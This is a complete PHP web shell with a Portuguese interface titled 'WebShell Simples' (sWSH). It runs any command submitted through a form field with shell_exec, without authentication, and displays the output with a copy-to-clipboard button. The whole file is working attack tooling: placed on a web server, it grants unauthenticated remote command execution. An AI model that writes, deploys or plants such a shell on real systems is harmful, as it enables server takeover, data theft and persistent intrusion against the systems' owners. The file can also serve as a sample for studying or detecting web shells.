<?php
if (!empty($_POST['cmd'])) {
  $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="data:image/png;base64,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" type="image/x-icon">
  <link href="css/estilo.css" rel="stylesheet" type="text/css">
  <title>sWSH</title>
</head>

<body>
  <main>
    <h1>+ WebShell Simples</h1>
    <h3>Utilize o campo para executar um comando:</h3><br>
    <form method="post">
      <h2><strong>&gt; Input:</strong></h2>
      <div class="form-group">
        <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
          onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
        <button type="submit">Executar</button>
      </div>
    </form>

    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
      <h2>&lt; Output</h2>
      <?php if (isset($cmd)): ?>
        <pre id="output"><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
        <button id="copy-button" class="copy">Copiar para o clipboard</button>
      <?php else: ?>
        <pre>Sem Resultados...</pre>
      <?php endif; ?>
    <?php endif; ?>
  </main>
  <script> <!-- Função botão de copiar para clipboard-->
    const copyButton = document.getElementById('copy-button');
    const output = document.getElementById('output');

    copyButton.addEventListener('click', () => {
      navigator.clipboard.writeText(output.innerText);
        copyButton.innerHTML = "Copiado!";
        setTimeout(() => {
          copyButton.innerHTML = "Copiar para o clipboard";
        }, 2000); // Tempo até o botão voltar ao normal
    });
  </script>
</body>
</html>
